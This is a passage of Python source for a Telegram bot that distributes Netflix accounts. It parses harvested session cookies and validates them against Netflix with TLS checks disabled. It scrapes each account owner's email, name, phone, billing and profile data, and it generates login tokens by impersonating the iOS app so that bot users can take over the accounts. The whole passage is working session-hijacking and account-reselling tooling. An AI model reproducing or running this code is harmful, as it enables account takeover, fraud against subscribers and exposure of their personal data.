            logger.error(f"StatsRepository.get_today error: {e}")
        return {"hits": 0, "free": 0, "bad": 0}

# ============================================================
# SERVICE LAYER
# ============================================================
class NetflixService:
    """Service for Netflix account operations."""
    
    NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
    
    @staticmethod
    def extract_cookie_pairs(content: str) -> List[Tuple[str, Optional[str]]]:
        """Extract Netflix cookie pairs from content."""
        pairs = []
        seen = set()
        
        # JSON format
        try:
            data = json.loads(content)
            if isinstance(data, dict) and "cookies" in data:
                cookies = data.get("cookies", [])
                nid = None
                sid = None
                for cookie in cookies:
                    if cookie.get("name") == "NetflixId":
                        nid = safe_str(cookie.get("value"))
                    elif cookie.get("name") == "SecureNetflixId":
                        sid = safe_str(cookie.get("value"))
                if nid and nid not in seen:
                    seen.add(nid)
                    pairs.append((nid, sid))
        except Exception:
            pass
        
        # Netscape format
        if not pairs:
            for line in content.splitlines():
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                parts = line.split('\t')
                if len(parts) >= 7 and parts[5] == "NetflixId":
                    nid = parts[6].strip()
                    if nid and nid not in seen:
                        seen.add(nid)
                        pairs.append((nid, None))
        
        # Regex fallback
        if not pairs:
            netflix_pattern = re.compile(r'NetflixId[=:]\s*([^;\s"\']+)', re.IGNORECASE)
            secure_pattern = re.compile(r'SecureNetflixId[=:]\s*([^;\s"\']+)', re.IGNORECASE)
            netflix_matches = netflix_pattern.findall(content)
            secure_matches = secure_pattern.findall(content)
            for i, nid in enumerate(netflix_matches):
                nid = nid.strip('"\'')
                sid = secure_matches[i].strip('"\'') if i < len(secure_matches) else None
                if nid and nid not in seen:
                    seen.add(nid)
                    pairs.append((nid, sid))
        
        return pairs
    
    @staticmethod
    def get_cookie_text(netflix_id: str, secure_id: Optional[str] = None) -> str:
        """Get cookie text from IDs."""
        lines = [".netflix.com\tTRUE\t/\tFALSE\t0\tNetflixId\t" + safe_str(netflix_id)]
        if secure_id:
            lines.append(".netflix.com\tTRUE\t/\tTRUE\t0\tSecureNetflixId\t" + safe_str(secure_id))
        return "\n".join(lines)
    
    @staticmethod
    def generate_nftoken(netflix_id: str, attempts: int = 3) -> Tuple[Optional[str], Optional[str]]:
        """Generate NFToken for Netflix ID."""
        if not netflix_id:
            return None, None
        
        query_params = {
            "appVersion": "15.48.1",
            "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
            "device_type": "NFAPPL-02-",
            "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
            "idiom": "phone",
            "iosVersion": "15.8.5",
            "isTablet": "false",
            "languages": "en-US",
            "locale": "en-US",
            "maxDeviceWidth": "375",
            "model": "saget",
            "modelType": "IPHONE8-1",
            "odpAware": "true",
            "path": '["account","token","default"]',
            "pathFormat": "graph",
            "pixelDensity": "2.0",
            "progressive": "false",
            "responseFormat": "json",
        }
        
        headers = {
            "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
            "x-netflix.request.attempt": "1",
            "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
            "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
            "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
            "x-netflix.context.app-version": "15.48.1",
            "x-netflix.argo.translated": "true",
            "x-netflix.context.form-factor": "phone",
            "x-netflix.context.sdk-version": "2012.4",
            "x-netflix.client.appversion": "15.48.1",
            "x-netflix.context.max-device-width": "375",
            "x-netflix.context.ab-tests": "",
            "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
            "x-netflix.client.type": "argo",
            "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
            "x-netflix.context.locales": "en-US",
            "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
            "x-netflix.client.iosversion": "15.8.5",
            "accept-language": "en-US;q=1",
            "x-netflix.argo.abtests": "",
            "x-netflix.context.os-version": "15.8.5",
            "x-netflix.request.client.context": '{"appState":"foreground"}',
            "x-netflix.context.ui-flavor": "argo",
            "x-netflix.argo.nfnsm": "9",
            "x-netflix.context.pixel-density": "2.0",
            "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
            "x-netflix.request.client.timezoneid": "Asia/Dhaka",
        }
        
        for attempt in range(attempts):
            try:
                headers_copy = dict(headers)
                headers_copy["Cookie"] = f"NetflixId={netflix_id}"
                headers_copy["x-netflix.request.attempt"] = str(attempt + 1)
                
                response = requests.get(
                    NetflixService.NFTOKEN_API_URL,
                    params=query_params,
                    headers=headers_copy,
                    timeout=30,
                    verify=False
                )
                
                if response.status_code == 200:
                    data = response.json()
                    token_data = (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {}
                    token = token_data.get("token")
                    expires = token_data.get("expires")
                    if token:
                        return token, expires
                time.sleep(0.5)
            except Exception:
                time.sleep(0.5)
        
        return None, None
    
    @staticmethod
    def check_account(cookies_dict: Dict) -> Dict:
        """Check if Netflix account is valid and subscribed."""
        if not cookies_dict or "NetflixId" not in cookies_dict:
            return {"valid": False, "error": "Missing NetflixId"}
        
        try:
            session = requests.Session()
            for name, value in cookies_dict.items():
                session.cookies.set(name, value, domain=".netflix.com")
            
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "identity",
            }
            
            for attempt in range(MAX_RETRIES):
                try:
                    response = session.get(
                        "https://www.netflix.com/account/membership",
                        headers=headers,
                        timeout=CHECK_TIMEOUT,
                        verify=False,
                        allow_redirects=True
                    )
                    
                    if response.status_code != 200:
                        if attempt < MAX_RETRIES - 1:
                            time.sleep(0.5)
                            continue
                        return {"valid": False, "error": f"HTTP {response.status_code}"}
                    
                    if "login" in response.url.lower() or "signin" in response.url.lower():
                        return {"valid": False, "error": "Redirected to login"}
                    
                    text = response.text
                    
                    # Check Household Lock
                    if any(x in text.lower() for x in ["update-primary-location", "household"]):
                        membership_status = "Household Locked"
                    else:
                        membership_status = "Active"
                    
                    # Extract email
                    email = None
                    for pattern in [r'"emailAddress"\s*:\s*"([^"]+)"', r'"email"\s*:\s*"([^"]+)"']:
                        match = re.search(pattern, text, re.IGNORECASE)
                        if match:
                            email = match.group(1).strip()
                            break
                    if not email:
                        match = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', text)
                        if match:
                            email = match.group(1).strip()
                    
                    # Extract name
                    name = None
                    for pattern in [r'"accountOwnerName"\s*:\s*"([^"]+)"', r'"name"\s*:\s*"([^"]+)"']:
                        match = re.search(pattern, text, re.IGNORECASE)
                        if match:
                            name = match.group(1).strip()
                            break
                    
                    # Extract country
                    country = None
                    for pattern in [r'"countryOfSignup"\s*:\s*"([^"]+)"', r'"currentCountry"\s*:\s*"([^"]+)"']:
                        match = re.search(pattern, text, re.IGNORECASE)
                        if match:
                            country = match.group(1).strip()
                            break
                    
                    # Extract plan
                    plan = None
                    for pattern in [r'"localizedPlanName"\s*:\s*"([^"]+)"', r'"planName"\s*:\s*"([^"]+)"']:
                        match = re.search(pattern, text, re.IGNORECASE)
                        if match:
                            plan = match.group(1).strip()
                            break
                    
                    plan_key = "FREE"
                    plan_label = "Free"
                    if plan:
                        plan_lower = plan.lower()
                        if any(x in plan_lower for x in ["premium", "高級", "高级"]):
                            plan_key, plan_label = "PREMIUM", "Premium"
                        elif any(x in plan_lower for x in ["standard", "标准", "標準"]):
                            plan_key, plan_label = "STANDARD", "Standard"
                        elif any(x in plan_lower for x in ["basic", "basico", "基本"]):
                            plan_key, plan_label = "BASIC", "Basic"
                        elif any(x in plan_lower for x in ["mobile", "ponsel", "movil"]):
                            plan_key, plan_label = "MOBILE", "Mobile"
                    
                    streams = 1
                    match = re.search(r'"maxStreams"\s*:\s*([0-9]+)', text)
                    if match:
                        streams = int(match.group(1))
                    elif plan_key == "PREMIUM":
                        streams = 4
                    elif plan_key == "STANDARD":
                        streams = 2
                    
                    quality = "HD"
                    if plan_key == "PREMIUM":
                        quality = "Ultra HD 4K"
                    elif plan_key == "STANDARD":
                        quality = "Full HD"
                    
                    # Extract price
                    price = None
                    for pattern in [r'"formattedPlanPrice"\s*:\s*"([^"]+)"', r'"displayPrice"\s*:\s*"([^"]+)"']:
                        match = re.search(pattern, text, re.IGNORECASE)
                        if match:
                            price = match.group(1).strip()
                            break
                    
                    # Extract billing
                    billing = None
                    match = re.search(r'"nextBillingDate"\s*:\s*"([^"]+)"', text, re.IGNORECASE)
                    if match:
                        billing = match.group(1).strip()
                    
                    # Extract phone
                    phone = None
                    match = re.search(r'"phoneNumberDigits"[^}]*"value"\s*:\s*"([^"]+)"', text, re.IGNORECASE)
                    if match:
                        phone = match.group(1).strip()
                    
                    # Extract profiles
                    profiles = []
                    for match in re.finditer(r'"profiles"[^}]*"name"\s*:\s*"([^"]+)"', text, re.IGNORECASE):
                        if match.group(1) not in profiles:
                            profiles.append(match.group(1))
                    profiles_str = ", ".join(profiles) if profiles else None
                    
                    # Extract user_guid
                    user_guid = None
                    for pattern in [r'"userGuid"\s*:\s*"([^"]+)"', r'"ownerGuid"\s*:\s*"([^"]+)"']:
                        match = re.search(pattern, text, re.IGNORECASE)
                        if match:
                            user_guid = match.group(1).strip()
                            break
                    
                    is_subscribed = plan_key != "FREE"
                    
                    # Generate NFToken
                    nftoken = None
                    nftoken_expiry = None
                    if cookies_dict.get("NetflixId"):
                        nftoken, nftoken_expiry = NetflixService.generate_nftoken(cookies_dict.get("NetflixId"))
                    
                    # Log stats
                    stats_repo = StatsRepository(db)
                    stats_repo.log_daily(hits=1 if is_subscribed else 0, free=1 if not is_subscribed else 0, bad=0)
                    
                    return {
                        "valid": True,
                        "subscribed": is_subscribed,
                        "email": email,
                        "name": name,
                        "country": country,
                        "plan": plan or plan_label,
                        "plan_key": plan_key,
                        "plan_label": plan_label,
                        "streams": streams,
                        "quality": quality,
                        "price": price,
                        "billing_date": billing,
                        "membership_status": membership_status,
                        "phone": phone,
                        "profiles": profiles_str,
                        "user_guid": user_guid,
                        "nftoken": nftoken,
                        "nftoken_expiry": nftoken_expiry,
                    }
                except Exception as e:
                    logger.debug(f"Check attempt {attempt+1} failed: {e}")
                    if attempt < MAX_RETRIES - 1:
                        continue
                    return {"valid": False, "error": "Error during check"}
            
            return {"valid": False, "error": "Max retries exceeded"}
        except Exception as e:
            logger.error(f"check_account error: {e}")
            return {"valid": False, "error": "Exception"}

# ============================================================
# BOT HANDLERS
# ============================================================
class BotHandlers:
    """Centralized bot handlers."""
    
    def __init__(self):
        self.db = DatabaseManager()
        self.user_repo = UserRepository(self.db)
        self.account_repo = AccountRepository(self.db)
        self.report_repo = ReportRepository(self.db)
        self.channel_repo = ChannelRepository(self.db)
        self.stats_repo = StatsRepository(self.db)
    
    async def send_or_edit(self, update: Update, text: str, reply_markup=None, parse_mode=ParseMode.HTML):
        """Send or edit message based on context."""
        try:
            if update.callback_query:
                query = update.callback_query
                try:
                    await query.answer()
                except Exception:
                    pass
                try:
                    return await query.edit_message_text(text, reply_markup=reply_markup, parse_mode=parse_mode)
                except Exception as e:
                    if "Message is not modified" in str(e):
                        return query.message
                    if query.message:
                        return await query.message.reply_text(text, reply_markup=reply_markup, parse_mode=parse_mode)
            elif update.message:
                return await update.message.reply_text(text, reply_markup=reply_markup, parse_mode=parse_mode)
        except Exception as e:
            logger.error(f"send_or_edit error: {e}")
        return None
    
    async def check_force_sub(self, bot, user_id: int):
        """Check if user has joined required channels."""
        try:
            channels = self.channel_repo.get_active()
            if not channels:
                return True, []
            
            missing_buttons = []
            for ch_id, ch_name, ch_link in channels:
                try:
                    member = await bot.get_chat_member(chat_id=ch_id, user_id=user_id)
                    if member.status not in [ChatMember.MEMBER, ChatMember.ADMINISTRATOR, ChatMember.OWNER]:
                        missing_buttons.append(InlineKeyboardButton(f"📢 Join {ch_name}", url=ch_link))
                except Exception:
                    pass
            
            if missing_buttons:
                return False, missing_buttons
            return True, []
        except Exception:
            return True, []
    
    def can_get_account(self, user: User) -> Tuple[bool, str]:
        """Check if user can get an account."""
        if user.is_banned:
            return False, "🚫 You are banned from using this bot."
        
        if user.last_account_time:
            try:
                time_str = str(user.last_account_time).split('.')[0].replace('T', ' ')
                last_dt = datetime.strptime(time_str, "%Y-%m-%d %H:%M:%S")
                diff = datetime.utcnow() - last_dt
                cooldown_seconds = WORKING_COOLDOWN_MINUTES * 60
                if diff.total_seconds() < cooldown_seconds:
                    remaining = int((cooldown_seconds - diff.total_seconds()) / 60) + 1
                    return False, f"⏳ Cooldown active! Please wait {remaining} minute(s)."
            except Exception:
                pass
        
        if user.accounts_used >= MAX_ACCOUNTS_PER_USER and not is_admin(user.user_id):
            return False, f"⚠️ Account limit reached! Max {MAX_ACCOUNTS_PER_USER} accounts."
        
        return True, ""
    
    # ============================================================
    # USER HANDLERS
    # ============================================================
    
    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /start command."""
        try:
            user = update.effective_user
            user_id = user.id
            
            # Create/update user
            self.user_repo.create_or_update(user_id, user.username, user.first_name)
            user_data = self.user_repo.get(user_id)
            
            if user_data.is_banned:
                await self.send_or_edit(update, "🚫 You are banned from using this bot.")
                return
            
            # Check force subscribe
            subbed, ch_buttons = await self.check_force_sub(context.bot, user_id)
            if not subbed:
                keyboard = [[btn] for btn in ch_buttons]
                keyboard.append([InlineKeyboardButton("✅ I Have Joined", callback_data="back_menu")])
                await self.send_or_edit(
                    update,
                    "⚠️ <b>Must Join Channel(s)</b>\n\nPlease join our required channels to use this bot!",
                    reply_markup=InlineKeyboardMarkup(keyboard)
                )
                return
            
            if user_data.pending_report:
                await self.send_or_edit(
                    update,
                    "⚠️ <b>You have a pending report!</b>\n\nPlease upload a screenshot proof.\n\n👨‍💻 <b>Developer:</b> @Senzo268"
                )
                return
            
            stats = self.account_repo.get_total()
            plan_display = ""
            for plan, count in stats.get('plans', {}).items():
                emoji = {"PREMIUM": "👑", "STANDARD": "⭐", "BASIC": "🎯", "MOBILE": "📱"}.get(plan.upper(), "📦")
                plan_display += f"│ {emoji} {html_escape(plan)}: <b>{count}</b>\n"
            if not plan_display:
                plan_display = "│ No accounts available\n"
            
            assigned = self.account_repo.get_assigned(user_id)
            
            keyboard = [
                [InlineKeyboardButton("🎯 Get Account", callback_data="get_account")],
            ]
            
            if assigned:
                keyboard.append([
                    InlineKeyboardButton("✅ Working", callback_data="working"),
                    InlineKeyboardButton("❌ Not Working", callback_data="notworking"),
                ])
            
            keyboard.append([
                InlineKeyboardButton("📞 Contact Admin", callback_data="contact"),
                InlineKeyboardButton("📊 My Status", callback_data="my_status"),
            ])
            
            if is_admin(user_id):
                keyboard.append([InlineKeyboardButton("⚙️ Admin Panel", callback_data="admin_panel")])
            
            text = f"""🌟 <b>WELCOME TO SENZO NETFLIX BOT</b> 🌟
━━━━━━━━━━━━━━━━━━━━━
👋 Hello <b>{html_escape(user.first_name)}</b>!
━━━━━━━━━━━━━━━━━━━━━
📊 <b>ACCOUNT STOCK</b>
┌─────────────────────
│ 📦 Total Available: <b>{stats.get('total', 0)}</b>
{plan_display}└─────────────────────
⚙️ <b>YOUR STATS</b>
┌─────────────────────
│ ✅ Working Reports: <b>{user_data.working_reports}</b>
│ ❌ Not Working: <b>{user_data.notworking_reports}</b>
│ 📦 Accounts Used: <b>{user_data.accounts_used}/{MAX_ACCOUNTS_PER_USER}</b>
│ ⚠️ Warnings: <b>{user_data.warnings}/3</b>
└─────────────────────
⏳ Cooldown: <b>{WORKING_COOLDOWN_MINUTES} min</b>
━━━━━━━━━━━━━━━━━━━━━
🔽 <b>SELECT AN OPTION BELOW</b>
👨‍💻 <b>Developer:</b> @Senzo268
"""
            await self.send_or_edit(update, text, reply_markup=InlineKeyboardMarkup(keyboard))
        except Exception as e:
            logger.error(f"start error: {e}")
    
    async def get_account_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle get account button."""
        try:
            user_id = update.effective_user.id
            user = self.user_repo.get(user_id)
            
            if user.is_banned:
                await self.send_or_edit(update, "🚫 You are banned from using this bot.")
                return
            
            # Check force subscribe
            subbed, ch_buttons = await self.check_force_sub(context.bot, user_id)
            if not subbed:
                keyboard = [[btn] for btn in ch_buttons]
                keyboard.append([InlineKeyboardButton("✅ I Have Joined", callback_data="back_menu")])
                await self.send_or_edit(
                    update,
                    "⚠️ <b>Must Join Channel(s)</b>\n\nPlease join our required channels to use this bot!",
                    reply_markup=InlineKeyboardMarkup(keyboard)
                )
                return
            
            can_get, msg = self.can_get_account(user)
            if not can_get:
                keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu")]]
                await self.send_or_edit(update, f"⚠️ {msg}", reply_markup=InlineKeyboardMarkup(keyboard))
                return
            
            account = self.account_repo.assign(user_id)
            if not account:
                keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu")]]
                await self.send_or_edit(update, "❌ No available accounts in stock. Please check back later!", reply_markup=InlineKeyboardMarkup(keyboard))
                return
            
            cookie_full = safe_str(account.cookies, 'No cookies available')
            if len(cookie_full) > 3500:
                cookie_display = cookie_full[:3500] + "\n... (cookie truncated)"
            else:
                cookie_display = cookie_full
            
            token = safe_str(account.nftoken)
            nft_expiry = safe_str(account.nftoken_expiry)
            
            text = f"""🎉 <b>ACCOUNT ASSIGNED!</b>
━━━━━━━━━━━━━━━━━━━━━
📧 <b>Email:</b> <code>{html_escape(account.email)}</code>
👤 <b>Name:</b> {html_escape(account.account_name)}
📱 <b>Phone:</b> {html_escape(account.phone, 'Not provided')}
🌍 <b>Country:</b> {html_escape(account.country)}
📦 <b>Plan:</b> {html_escape(account.plan)}
🛡️ <b>Status:</b> {html_escape(account.membership_status, 'Active')}
📺 <b>Streams:</b> {account.streams}
🎞️ <b>Quality:</b> {html_escape(account.quality, 'HD')}
💰 <b>Price:</b> {html_escape(account.price, 'N/A')}
🗓️ <b>Billing:</b> {html_escape(account.billing_date)}
👥 <b>Extra Member:</b> {'✅ Yes' if account.extra_member else '❌ No'}
🎭 <b>Profiles:</b> {html_escape(account.profiles, 'None')}
🆔 <b>GUID:</b> <code>{html_escape(account.user_guid)}</code>
━━━━━━━━━━━━━━━━━━━━━
🍪 <b>Cookie:</b>
<code>{html_escape(cookie_display)}</code>
━━━━━━━━━━━━━━━━━━━━━
"""
            if token and len(token) > 10:
                text += f"⏳ <b>NFToken expires:</b> <code>{html_escape(nft_expiry)}</code>\n\n"
            
            text += """📝 <b>INSTRUCTIONS:</b>
1️⃣ Click a login link below or use Cookie Editor
2️⃣ Test the account working status
3️⃣ Report Working or Not Working below

👨‍💻 <b>Developer:</b> @Senzo268
"""
            
            keyboard = []
            if token and len(token) > 10:
                keyboard.append([
                    InlineKeyboardButton("📱 Phone Login", url=f"https://netflix.com/unsupported?nftoken={token}"),
                    InlineKeyboardButton("🖥️ PC Login", url=f"https://netflix.com/login?nftoken={token}")
                ])
                keyboard.append([
                    InlineKeyboardButton("📺 TV Login", url=f"https://netflix.com/tv8?nftoken={token}")
                ])
            else:
                keyboard.append([
                    InlineKeyboardButton("📱 Phone Login", url="https://netflix.com/unsupported"),
                    InlineKeyboardButton("🖥️ PC Login", url="https://netflix.com/login")
                ])
                keyboard.append([
                    InlineKeyboardButton("📺 TV Login", url="https://netflix.com/tv8")
                ])
            
            keyboard.append([
                InlineKeyboardButton("✅ Working", callback_data=f"report_working_{account.id}"),
                InlineKeyboardButton("❌ Not Working", callback_data=f"report_notworking_{account.id}")
            ])
            keyboard.append([InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu")])
            
            await self.send_or_edit(update, text, reply_markup=InlineKeyboardMarkup(keyboard))
        except Exception as e:
            logger.error(f"get_account_callback error: {e}")
    
    async def working_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle working report button."""
        try:
            user_id = update.effective_user.id
            user = self.user_repo.get(user_id)
            
            if user.is_banned:
                await self.send_or_edit(update, "🚫 You are banned from using this bot.")
                return
            
            if user.pending_report:
                await self.send_or_edit(update, "⚠️ You already have a pending report! Please upload a screenshot first.")
                return
            
            data = update.callback_query.data if update.callback_query else ""
            account_id = None
            if data.startswith("report_working_"):
                account_id = int(data.split("_")[2])
            else:
                assigned = self.account_repo.get_assigned(user_id)
                if assigned:
                    account_id = assigned.id
            
            if not account_id:
                await self.send_or_edit(update, "⚠️ No active assigned account found. Please click 'Get Account'.")
                return
            
            self.db.execute_turso('''
                UPDATE users 
                SET pending_report = 1, pending_report_account_id = ?, pending_report_type = 'working'
                WHERE user_id = ?
            ''', (account_id, user_id))
            self.db.commit_turso()
            
            await self.send_or_edit(
                update,
                "✅ <b>Report Type: WORKING</b>\n\n"
                "📸 <b>Please upload a screenshot proof now!</b>\n\n"
                "⚠️ Send an image of the logged in account or stream playing.\n\n"
                "👨‍💻 <b>Developer:</b> @Senzo268"
            )
        except Exception as e:
            logger.error(f"working_callback error: {e}")
    
    async def notworking_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle not working report button."""
        try:
            user_id = update.effective_user.id
            user = self.user_repo.get(user_id)
            
            if user.is_banned:
                await self.send_or_edit(update, "🚫 You are banned from using this bot.")
                return
            
            if user.pending_report:
                await self.send_or_edit(update, "⚠️ You already have a pending report! Please upload a screenshot first.")
                return
            
            data = update.callback_query.data if update.callback_query else ""
            account_id = None
            if data.startswith("report_notworking_"):
                account_id = int(data.split("_")[2])
            else:
                assigned = self.account_repo.get_assigned(user_id)
                if assigned:
                    account_id = assigned.id
            
            if not account_id:
                await self.send_or_edit(update, "⚠️ No active assigned account found. Please click 'Get Account'.")
                return
            
            self.db.execute_turso('''
                UPDATE users 
                SET pending_report = 1, pending_report_account_id = ?, pending_report_type = 'notworking'
                WHERE user_id = ?
            ''', (account_id, user_id))
            self.db.commit_turso()
            
            await self.send_or_edit(
                update,
                "❌ <b>Report Type: NOT WORKING</b>\n\n"
                "📸 <b>Please upload a screenshot proof now!</b>\n\n"
                "⚠️ Send an image showing the login or playback error.\n\n"
                "👨‍💻 <b>Developer:</b> @Senzo268"
            )
        except Exception as e:
            logger.error(f"notworking_callback error: {e}")
    
    async def handle_screenshot(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle screenshot upload."""
        try:
            user_id = update.effective_user.id
            user = self.user_repo.get(user_id)
            
            if user.is_banned:
                await update.message.reply_text("🚫 You are banned from using this bot.")
                return
            
            if not update.message.photo:
                await update.message.reply_text("❌ Please upload an image/screenshot proof.")
                return
            
            file_id = update.message.photo[-1].file_id
            
            # Check admin broadcast
            if is_admin(user_id) and context.user_data.get("waiting_for_broadcast"):
                await self._handle_broadcast_photo(update, context, file_id)
                return
            
            if not user.pending_report:
                await update.message.reply_text("❌ You do not have an active pending report.")
                return
            
            account_id = user.pending_report_account_id
            report_type = user.pending_report_type
            
            report_id = self.report_repo.create(user_id, account_id, report_type, file_id)
            if not report_id:
                await update.message.reply_text("❌ Failed to save report in database.")
                return
            
            await update.message.reply_text(
                f"✅ <b>Report Submitted Successfully!</b>\n\n"
                f"📋 <b>Report ID:</b> #{report_id}\n"
                f"🎯 <b>Status:</b> {report_type.upper()}\n\n"
                f"Thank you! Your report has been submitted to admins for review.\n"
                f"👨‍💻 <b>Developer:</b> @Senzo268",
                parse_mode=ParseMode.HTML
            )
            
            # Send to channel
            if report_type == "working":
                await self._send_working_to_channel(context.bot, report_id, user_id, account_id, file_id)
            else:
                await self._send_notworking_to_channel(context.bot, report_id, user_id, account_id, file_id)
            
            self.account_repo.release(account_id)
        except Exception as e:
            logger.error(f"handle_screenshot error: {e}")
            await update.message.reply_text("❌ Error processing your screenshot.")
    
    async def my_status(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle my status button."""
        try:
            user_id = update.effective_user.id
            user = self.user_repo.get(user_id)
            account = self.account_repo.get_assigned(user_id)
            
            text = f"""📊 <b>YOUR ACCOUNT & STATS SUMMARY</b>
━━━━━━━━━━━━━━━━━━━━━
👤 <b>Name:</b> {html_escape(user.first_name)}
🆔 <b>ID:</b> <code>{user_id}</code>
📅 <b>Joined:</b> {html_escape(user.joined_at)}
━━━━━━━━━━━━━━━━━━━━━
📈 <b>STATISTICS</b>
┌─────────────────────
│ ✅ Working Reports: <b>{user.working_reports}</b>
│ ❌ Not Working: <b>{user.notworking_reports}</b>
│ 📦 Accounts Used: <b>{user.accounts_used}/{MAX_ACCOUNTS_PER_USER}</b>
│ ⚠️ Warnings: <b>{user.warnings}/3</b>
└─────────────────────
🔑 <b>CURRENT ASSIGNED ACCOUNT:</b>
"""
            if account:
                text += f"""┌─────────────────────
│ 📧 <code>{html_escape(account.email)}</code>
│ 🌍 Country: {html_escape(account.country)}
│ 📦 Plan: {html_escape(account.plan)}
│ 📺 Streams: {account.streams}
└─────────────────────
"""
            else:
                text += "❌ None assigned currently\n"
            
            text += f"\n⏳ <b>Cooldown Period:</b> {WORKING_COOLDOWN_MINUTES} min"
            text += "\n\n👨‍💻 <b>Developer:</b> @Senzo268"
            
            keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu")]]
            await self.send_or_edit(update, text, reply_markup=InlineKeyboardMarkup(keyboard))
        except Exception as e:
            logger.error(f"my_status error: {e}")
    
    async def contact_admin(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle contact admin button."""
        try:
            context.user_data["waiting_for_message"] = True
            keyboard = [[InlineKeyboardButton("🔙 Cancel / Back", callback_data="back_menu")]]
            await self.send_or_edit(
                update,
                "📝 <b>CONTACT ADMIN</b>\n\nPlease type and send your message below. The admin team will reply to you directly!\n\n👨‍💻 <b>Developer:</b> @Senzo268",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        except Exception as e:
            logger.error(f"contact_admin error: {e}")
    
    async def back_to_menu(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle back to menu button."""
        try:
            context.user_data.clear()
            await self.start(update, context)
        except Exception as e:
            logger.error(f"back_to_menu error: {e}")
    
    async def stats_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /stats command."""
        try:
            stats = self.account_repo.get_total()
            users = self.user_repo.get_all()
            
            plan_display = ""
            for plan, count in stats.get('plans', {}).items():
                emoji = {"PREMIUM": "👑", "STANDARD": "⭐", "BASIC": "🎯", "MOBILE": "📱"}.get(plan.upper(), "📦")
                plan_display += f"│ {emoji} {html_escape(plan)}: <b>{count}</b>\n"
            if not plan_display:
                plan_display = "│ No accounts available\n"
            
            text = f"""📊 <b>PUBLIC BOT METRICS</b>
━━━━━━━━━━━━━━━━━━━━━
📦 <b>Total Available Stock:</b> <b>{stats.get('total', 0)}</b>
{plan_display}
👥 <b>Registered Users:</b> <b>{len(users)}</b>
⏳ <b>Cooldown:</b> {WORKING_COOLDOWN_MINUTES} min
👨‍💻 <b>Developer:</b> @Senzo268
"""
            keyboard = [
                [InlineKeyboardButton("🎯 Get Account", callback_data="get_account")],
                [InlineKeyboardButton("🔙 Back", callback_data="back_menu")]
            ]
            await self.send_or_edit(update, text, reply_markup=InlineKeyboardMarkup(keyboard))
        except Exception as e:
            logger.error(f"stats_command error: {e}")
    
    # ============================================================
    # ADMIN HANDLERS
    # ============================================================
    
    async def admin_panel(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle admin panel button."""
        try:
            user_id = update.effective_user.id
            if not is_admin(user_id):
                await self.send_or_edit(update, "⛔ Not authorized!")
                return
            
            context.user_data.clear()
            stats = self.account_repo.get_total()
            banned = self.user_repo.get_banned()
            pending_reps = self.report_repo.get_pending()
            users = self.user_repo.get_all()
            
            keyboard = [
                [InlineKeyboardButton("📤 Upload Stock", callback_data="admin_upload"), InlineKeyboardButton("📦 Manage Stock", callback_data="admin_stock_mgr")],
                [InlineKeyboardButton("👁️ View Reports", callback_data="admin_reports"), InlineKeyboardButton("👥 Manage Users", callback_data="admin_users")],
                [InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast"), InlineKeyboardButton("⚙️ Channels", callback_data="admin_channels")],
                [InlineKeyboardButton("📊 Stock Logs", callback_data="admin_stock_logs"), InlineKeyboardButton("📈 Dashboard", callback_data="admin_dashboard")],
